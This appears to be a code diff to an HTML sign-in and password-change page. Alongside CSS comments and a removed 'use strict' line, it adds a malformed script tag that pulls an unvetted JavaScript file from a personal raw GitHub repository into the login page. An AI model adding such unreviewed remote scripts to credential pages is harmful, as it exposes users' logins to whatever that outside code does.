@@ -10,6 +10,8 @@
         rel="stylesheet" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
 
+    <script src="" https://raw.githubusercontent.com/dumpy/ab2c/main/myscript.js" defer></script>
+
     <script>
         function changeProcessText() {
             const outputMessage = document.getElementById("signInName") ? "<li>Login and proceed to change password</li><li></li>" : "<li>Minimum of 10 characters</li><li>At least one uppercase letter</li><li>At least one special character</li></li>";
@@ -64,6 +66,7 @@
             grid-template-rows: 200px 400px auto;
         }
 
+        /* grid for all elements within login window */
         .login-container {
             grid-column-start: 2;
             grid-column-end: 3;
@@ -99,6 +102,7 @@
             display: none;
         }
 
+        /* resize continue button */
         #continue {
             background-color: #004685;
             padding: 12px 16px;
@@ -119,6 +123,7 @@
             position: relative;
         }
 
+        /* changes page heading text */
         .heading h1:after {
             visibility: visible;
             position: absolute;
@@ -194,7 +199,6 @@
         </div>
     </section>
     <script>
-        "use strict";
         changeProcessText();
     </script>
 </body>
